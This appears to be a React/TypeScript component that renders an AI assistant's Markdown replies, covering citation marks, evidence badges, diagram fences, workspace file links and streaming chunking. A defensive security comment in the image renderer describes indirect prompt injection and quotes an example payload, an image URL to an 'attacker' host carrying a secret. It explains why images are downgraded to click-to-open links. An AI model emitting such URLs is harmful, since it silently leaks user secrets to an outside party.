import {
  cleanSourceTitle,
  inlineSourceLabel,
  urlsPointSameSource,
} from "@/lib/citations";
import type { FileSource } from "@/lib/fileSource";
import { remarkCitations } from "@/lib/remarkCitations";
import { remarkEvidence } from "@/lib/remarkEvidence";
import { remarkWorkspacePaths } from "@/lib/remarkWorkspacePaths";
import { texDelimitersToDollars } from "@/lib/texDelimiters";
import {
  isWorkspaceFilePath,
  normalizeWorkspaceRelPath,
} from "@/lib/workspaceFilePath";
import type { Citation, TurnEvidenceLedgerEntry } from "@/types/events";
import {
  type ComponentPropsWithoutRef,
  type ReactNode,
  isValidElement,
  memo,
  useMemo,
} from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import { CodeBlock, nodeText } from "./CodeBlock";
import { DiagramBlock } from "./Diagram";
import { EvidenceBadge } from "./EvidenceBadge";
import { Favicon } from "./Favicon";
import { SourceTooltip } from "./SourcePreview";
import { CompareFence } from "./compare/CompareFence";
import { rehypeCodeMeta } from "./rehypeCodeMeta";
import { splitMarkdownBlocks } from "./streamingMarkdown";

function ledgerEntryAsCitation(
  entry: TurnEvidenceLedgerEntry,
): Citation | null {
  const url = (entry.url ?? "").trim();
  if (!url) return null;
  return {
    url,
    title: entry.title ?? "",
    snippet: entry.snippet ?? "",
    site: entry.site ?? "",
    id: entry.id,
    date: entry.date,
    tier: entry.tier,
    query: entry.query,
    deep_read: entry.deep_read,
    registrant: entry.registrant,
    citable: entry.citable,
  };
}

type ReactMarkdownProps = ComponentPropsWithoutRef<typeof ReactMarkdown>;

// Stable references so ReactMarkdown doesn't re-init plugins on every keystroke
// of the streaming content. `rehypeCodeMeta` runs before highlight so a
// `lang:path` fence still highlights (and surfaces its filename header).
const remarkPlugins = [remarkGfm, remarkMath];
// Finished turn: `ignoreMissing` keeps an unknown ```lang from throwing.
const rehypeHighlighted: ReactMarkdownProps["rehypePlugins"] = [
  rehypeCodeMeta,
  [rehypeHighlight, { ignoreMissing: true }],
  rehypeKatex,
];
// While streaming we drop rehype-highlight — re-tokenizing every code block on
// each delta is the dominant streaming cost. Code shows as plain monospace until
// the turn finishes (same defer-while-streaming policy as the diagram blocks),
// then highlights once on the final render below.
const rehypeStreaming: ReactMarkdownProps["rehypePlugins"] = [
  rehypeCodeMeta,
  rehypeKatex,
];

/**
 * One memoized Markdown chunk.
 *
 * The streaming reply is split into a list of top-level blocks
 * ({@link splitMarkdownBlocks}); rendering each as its own memoized chunk lets
 * every finished block skip re-parsing on every delta — only the chunk whose
 * `content` actually changed (the live tail block) re-renders, so a whole turn
 * costs O(total) instead of O(n²). Plugin/component props are stable
 * module-level / memoized refs, so `memo`'s shallow compare holds across deltas.
 */
const MarkdownChunk = memo(function MarkdownChunk({
  content,
  remarkPlugins: remarks,
  rehypePlugins: rehype,
  components,
}: {
  content: string;
  remarkPlugins: ReactMarkdownProps["remarkPlugins"];
  rehypePlugins: ReactMarkdownProps["rehypePlugins"];
  components: Components;
}) {
  return (
    <ReactMarkdown
      remarkPlugins={remarks}
      rehypePlugins={rehype}
      components={components}
    >
      {content}
    </ReactMarkdown>
  );
});

/**
 * Resolve a `#rN` link target: prefer ``citations[].id`` (P2 引用集), else fall
 * back to the turn evidence ledger entry (same URL / meta). Mid-turn ledger can
 * arrive before ``citations_event``; without this fallback the remark rewrite
 * leaves raw ``#rN`` visible.
 */
function resolveLedgerCitation(
  ledgerId: string,
  citations: Citation[],
  evidenceLedger: readonly TurnEvidenceLedgerEntry[] | null | undefined,
): Citation | null {
  const byId = citations.find((c) => c.id === ledgerId);
  if (byId?.url) return withLedgerRead(byId, evidenceLedger);
  const entry = evidenceLedger?.find((e) => e.id === ledgerId);
  if (!entry) return null;
  const asCite = ledgerEntryAsCitation(entry);
  if (!asCite) return null;
  const matchedByUrl = citations.find((c) =>
    urlsPointSameSource(c.url, asCite.url),
  );
  return withLedgerRead(matchedByUrl ?? asCite, evidenceLedger);
}

function withLedgerRead(
  citation: Citation,
  evidenceLedger: readonly TurnEvidenceLedgerEntry[] | null | undefined,
): Citation {
  if (citation.deep_read) return citation;
  const id = citation.id;
  if (!id) return citation;
  const entry = evidenceLedger?.find((e) => e.id === id);
  if (!entry?.deep_read) return citation;
  return { ...citation, deep_read: true };
}

function sourceLinkAria(citation: Citation, ledgerId?: string): string {
  const full =
    cleanSourceTitle(citation.title) || citation.site || citation.url || "来源";
  if (ledgerId) {
    return citation.deep_read
      ? `${full}（${ledgerId}，已读）`
      : `${full}（${ledgerId}）`;
  }
  return citation.deep_read ? `${full}（已读）` : full;
}

function citationForHref(
  href: string,
  citations: Citation[],
  evidenceLedger: readonly TurnEvidenceLedgerEntry[] | null | undefined,
): Citation | null {
  const hit = citations.find((c) => urlsPointSameSource(c.url, href));
  if (hit) return withLedgerRead(hit, evidenceLedger);
  const entry = evidenceLedger?.find((e) => urlsPointSameSource(e.url, href));
  if (!entry) return null;
  const asCite = ledgerEntryAsCitation(entry);
  return asCite ? withLedgerRead(asCite, evidenceLedger) : null;
}

/**
 * Sentence-level source: site name stays in the paragraph's inline formatting
 * context (Primer octicon / Font Awesome). Do not wrap the label in
 * `inline-flex` — a flex box whose first item is an icon synthesizes its
 * baseline from the icon's bottom edge and drops the whole mark below CJK.
 */
function SourceAnchor({
  citation,
  href,
  ariaLabel,
  children,
}: {
  citation: Citation;
  href: string;
  ariaLabel?: string;
  children: ReactNode;
}) {
  return (
    <SourceTooltip citation={citation}>
      <a
        href={href}
        target="_blank"
        rel="noreferrer"
        {...(ariaLabel ? { "aria-label": ariaLabel } : {})}
        className="mx-[0.15em] text-primary no-underline"
      >
        <Favicon
          site={citation.site}
          title={citation.title}
          size="1em"
          className="mr-[0.25em] bg-background"
        />
        <span>{children}</span>
      </a>
    </SourceTooltip>
  );
}

/**
 * `#rN` / `[n]`: favicon + site name in the sentence. Unregistered ids stay
 * plain text. Model-authored GFM `[短名](url)` is decorated in the markdown `a`
 * renderer.
 */
function CitationMark({
  "data-n": dataN,
  "data-ledger-id": dataLedgerId,
  citations,
  evidenceLedger,
}: {
  "data-n"?: string;
  "data-ledger-id"?: string;
  children?: ReactNode;
  citations: Citation[];
  evidenceLedger?: readonly TurnEvidenceLedgerEntry[] | null;
}) {
  if (dataLedgerId) {
    const citation = resolveLedgerCitation(
      dataLedgerId,
      citations,
      evidenceLedger,
    );
    if (!citation?.url) return <>{dataLedgerId}</>;
    return (
      <SourceAnchor
        citation={citation}
        href={citation.url}
        ariaLabel={sourceLinkAria(citation, dataLedgerId)}
      >
        {inlineSourceLabel(citation)}
      </SourceAnchor>
    );
  }

  const canonical = Number(dataN);
  if (!Number.isFinite(canonical) || canonical < 1) {
    return <>{dataN != null ? `[${dataN}]` : null}</>;
  }
  const pooled = citations[canonical - 1];
  if (!pooled?.url) {
    return <>{`[${canonical}]`}</>;
  }
  const citation = withLedgerRead(pooled, evidenceLedger);
  return (
    <SourceAnchor
      citation={citation}
      href={citation.url}
      ariaLabel={sourceLinkAria(citation)}
    >
      {inlineSourceLabel(citation)}
    </SourceAnchor>
  );
}

function WorkspaceFileMark({
  path,
  onOpen,
  children,
}: {
  path: string;
  onOpen: (path: string) => void;
  children?: ReactNode;
}) {
  return (
    <button
      type="button"
      onClick={() => onOpen(path)}
      aria-label={`打开 ${path}`}
      title={`打开 ${path}`}
      className="inline p-0 text-left font-medium text-primary"
    >
      {children ?? path}
    </button>
  );
}

interface Props {
  content: string;
  /** 会话 id — compare 围栏经工作区源加载图片时需要。 */
  conversationId?: string | null;
  /** 显式工作区源；与 conversationId 并存，显式源优先传给 compare 围栏。 */
  fileSource?: FileSource | null;
  /** Web sources for this message; `#rN` / `[n]` become favicon+site marks in
   * the sentence. Model `[短名](url)` matching the ledger keeps the short name
   * and gets the same favicon. */
  citations?: Citation[];
  /** While true, defer rendering ```mermaid/```markmap blocks (a half-written
   * diagram is a syntax error) — they show source until the turn finishes.
   * Non-muted live answer also paints a tail caret (`data-stream-caret`).
   * **Not** a typewriter: tokens still land via rAF; caret is decorative. */
  isStreaming?: boolean;
  /** Render in a muted tone for secondary content (a turn's reasoning), so the
   * structured thinking reads as quieter than the answer body. */
  muted?: boolean;
  /** Debate speech only (举证责任 P3): render inline `【已核实·出处】` / `【待核实·推断】`
   * evidence-status markers as {@link EvidenceBadge} chips. Off everywhere else so the
   * marker convention never leaks into ordinary assistant markdown. */
  evidence?: boolean;
  /** Known turn-ledger ids (`#rN`) for inline rewrite; unknown ids stay plain text.
   * When omitted, derived from ``evidenceLedger`` + ``citations[].id``. */
  knownLedgerIds?: ReadonlySet<string> | null;
  /** Turn research ledger — `#rN` chip URL fallback when citations lag or omit id. */
  evidenceLedger?: readonly TurnEvidenceLedgerEntry[] | null;
  /**
   * 助手终稿：工作区相对路径可点开（聊天流产物清单卡已撤）。
   * 不传则不改写路径（思考 / 过程 / 文件预览等保持纯文本）。
   */
  onOpenWorkspacePath?: (path: string) => void;
}

/**
 * Assistant-message Markdown: GFM (tables/strikethrough/task lists), syntax
 * highlighting with a per-block copy button, KaTeX math ($…$ / $$…$$ and
 * `\(...\)` / `\[...\]`),
 * ```mermaid / ```markmap diagrams (rendered via Diagram.tsx), and — when the
 * message has sources — `[n]` / `#rN` rewritten as favicon + site links; GFM
 * `[短名](url)` matching the ledger keeps the model text. Assistant replies may
 * also pass {@link Props.onOpenWorkspacePath} so workspace-relative file paths
 * in the body open the File tab (产物清单卡已撤).
 */
export const Markdown = memo(function Markdown({
  content,
  conversationId = null,
  fileSource = null,
  citations,
  isStreaming = false,
  muted = false,
  evidence = false,
  knownLedgerIds = null,
  evidenceLedger = null,
  onOpenWorkspacePath,
}: Props) {
  const citationCount = citations?.length ?? 0;
  const resolvedLedgerIds = useMemo(() => {
    if (knownLedgerIds && knownLedgerIds.size > 0) return knownLedgerIds;
    const ids = new Set<string>();
    for (const e of evidenceLedger ?? []) {
      if (e.id) ids.add(e.id);
    }
    for (const c of citations ?? []) {
      if (c.id) ids.add(c.id);
    }
    return ids.size > 0 ? ids : null;
  }, [knownLedgerIds, evidenceLedger, citations]);
  const ledgerIdCount = resolvedLedgerIds?.size ?? 0;

  // Only enrich once sources / ledger ids exist (they arrive at end-of-turn), so streaming
  // deltas keep using the stable module-level remark plugins. `evidence` (debate
  // speech) appends remarkEvidence; deps-memoized so it stays a stable ref across deltas.
  const linkWorkspace = Boolean(onOpenWorkspacePath);
  const remarks = useMemo(() => {
    if (citationCount <= 0 && ledgerIdCount <= 0 && !evidence && !linkWorkspace)
      return remarkPlugins;
    return [
      ...remarkPlugins,
      ...(citationCount > 0 || ledgerIdCount > 0
        ? [remarkCitations(citationCount, resolvedLedgerIds)]
        : []),
      ...(evidence ? [remarkEvidence()] : []),
      ...(linkWorkspace ? [remarkWorkspacePaths()] : []),
    ];
  }, [
    citationCount,
    ledgerIdCount,
    resolvedLedgerIds,
    evidence,
    linkWorkspace,
  ]);

  const comps = useMemo<Components>(() => {
    // Route ```mermaid / ```markmap / ```vega-lite fences to the diagram
    // renderer; everything else stays the normal copy-button code block. The
    // language regex allows hyphens so "vega-lite" is captured whole.
    const pre = (props: ComponentPropsWithoutRef<"pre">) => {
      const child = props.children;
      const className = isValidElement(child)
        ? ((child.props as { className?: string }).className ?? "")
        : "";
      const lang = /language-([\w-]+)/.exec(className)?.[1] ?? "";
      const kind =
        lang === "mermaid" || lang === "markmap"
          ? lang
          : lang === "vega-lite" || lang === "vega" || lang === "vegalite"
            ? "vega-lite"
            : null;
      if (kind) {
        return (
          <DiagramBlock
            kind={kind}
            code={nodeText(child)}
            streaming={isStreaming}
          />
        );
      }
      if (lang === "compare") {
        return (
          <CompareFence
            body={nodeText(child)}
            conversationId={conversationId}
            fileSource={fileSource}
          />
        );
      }
      return <CodeBlock {...props} />;
    };

    // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
    // image to a click-to-open link — never an auto-loading <img>. ReactMarkdown maps
    // `![](url)` to this component, and no rehype-raw is loaded, so raw <img> HTML in
    // the reply is inert text. The other image path is ```compare → WorkspaceImage,
    // which only loads workspace-relative paths via FileSource.read (never the fence URL).
    // Without it, an indirect-injection payload like `![](http://attacker/?d=<secret>)`
    // would fetch on render = a no-click, silent exfil beacon for anything the model was
    // induced to encode in the URL. As a link, egress needs an explicit user click (the
    // same bar as any model-emitted link). Citation favicons go through <Favicon>
    // (backend proxy, a separate trusted path), so they're unaffected.
    const img = ({ src, alt }: ComponentPropsWithoutRef<"img">) => {
      const href = typeof src === "string" ? src : undefined;
      const label =
        typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
      if (!href) return <>{label}</>;
      return (
        <a
          href={href}
          target="_blank"
          rel="noreferrer"
          className="text-primary no-underline"
        >
          {label}
        </a>
      );
    };

    const a =
      citationCount > 0 || ledgerIdCount > 0 || onOpenWorkspacePath
        ? ({
            href,
            children,
            node: _node,
            ...props
          }: ComponentPropsWithoutRef<"a"> & { node?: unknown }) => {
            const url = typeof href === "string" ? href : "";
            if (onOpenWorkspacePath && url && isWorkspaceFilePath(url)) {
              return (
                <WorkspaceFileMark
                  path={normalizeWorkspaceRelPath(url)}
                  onOpen={onOpenWorkspacePath}
                >
                  {children}
                </WorkspaceFileMark>
              );
            }
            const cited = url
              ? citationForHref(url, citations ?? [], evidenceLedger)
              : null;
            if (cited) {
              return (
                <SourceAnchor citation={cited} href={cited.url || url}>
                  {children}
                </SourceAnchor>
              );
            }
            return (
              <a
                href={href}
                target="_blank"
                rel="noreferrer"
                {...props}
                className="text-primary no-underline"
              >
                {children}
              </a>
            );
          }
        : undefined;

    const base: Components = a ? { pre, img, a } : { pre, img };
    // Citation marks: remarkCitations emits `citemark` via data.hProperties (not a
    // cite: link url — urlTransform would strip that). Same seam as evidencemark.
    // Register whenever pool or ledger ids exist — marks may resolve URL from ledger alone.
    if (citationCount > 0 || ledgerIdCount > 0) {
      const pool = citations ?? [];
      const CiteMark = (props: {
        "data-n"?: string;
        "data-ledger-id"?: string;
        children?: ReactNode;
      }) => (
        <CitationMark
          data-n={props["data-n"]}
          data-ledger-id={props["data-ledger-id"]}
          citations={pool}
          evidenceLedger={evidenceLedger}
        >
          {props.children}
        </CitationMark>
      );
      (base as Record<string, unknown>).citemark = CiteMark;
    }
    // 举证徽章（P3）：remarkEvidence 产出的自定义 `evidencemark` 元素映射到 EvidenceBadge。
    // 仅辩论发言 opt-in（evidence=true），不扰其余 markdown。
    if (evidence) {
      (base as Record<string, unknown>).evidencemark = EvidenceBadge;
    }
    if (onOpenWorkspacePath) {
      const FileMark = (props: {
        "data-path"?: string;
        children?: ReactNode;
      }) => {
        const path = props["data-path"]?.trim() ?? "";
        if (!path) return <>{props.children}</>;
        return (
          <WorkspaceFileMark path={path} onOpen={onOpenWorkspacePath}>
            {props.children}
          </WorkspaceFileMark>
        );
      };
      (base as Record<string, unknown>).filemark = FileMark;
    }
    return base;
  }, [
    citationCount,
    ledgerIdCount,
    citations,
    evidenceLedger,
    isStreaming,
    evidence,
    conversationId,
    fileSource,
    onOpenWorkspacePath,
  ]);

  // While streaming, split into per-block memoized chunks so each finished block
  // parses exactly once (逐块记忆化·Stage 4) — only the live tail re-parses per
  // delta — with highlight deferred (rehypeStreaming). The finished turn renders
  // as one document with highlight, so any cross-block references the conservative
  // split would miss mid-stream resolve in the end state.
  const rehype = isStreaming ? rehypeStreaming : rehypeHighlighted;
  // `\(`/`\[` → dollars before remark-math (and before the stream split so a
  // closed display block stays in one chunk). Stored journal text is unchanged.
  const mathContent = texDelimitersToDollars(content);
  const blocks = isStreaming ? splitMarkdownBlocks(mathContent) : null;

  const streamCaret = isStreaming && !muted && content.trim().length > 0;

  return (
    <div
      className={`markdown-body min-w-0 max-w-full [overflow-wrap:anywhere] ${muted ? "text-muted-foreground" : "text-foreground"}`}
      {...(streamCaret ? { "data-stream-caret": "" } : {})}
    >
      {blocks ? (
        blocks.map((block, i) => (
          <MarkdownChunk
            // Streaming blocks are an append-only list: block i keeps its identity
            // across deltas (a finished block never moves), so the index is the
            // stable key; MarkdownChunk's content-compare handles the rare
            // tail-boundary flicker before a block finalizes.
            // biome-ignore lint/suspicious/noArrayIndexKey: append-only streaming blocks — index is the stable identity
            key={i}
            content={block}
            remarkPlugins={remarks}
            rehypePlugins={rehype}
            components={comps}
          />
        ))
      ) : (
        <MarkdownChunk
          content={mathContent}
          remarkPlugins={remarks}
          rehypePlugins={rehype}
          components={comps}
        />
      )}
    </div>
  );
});
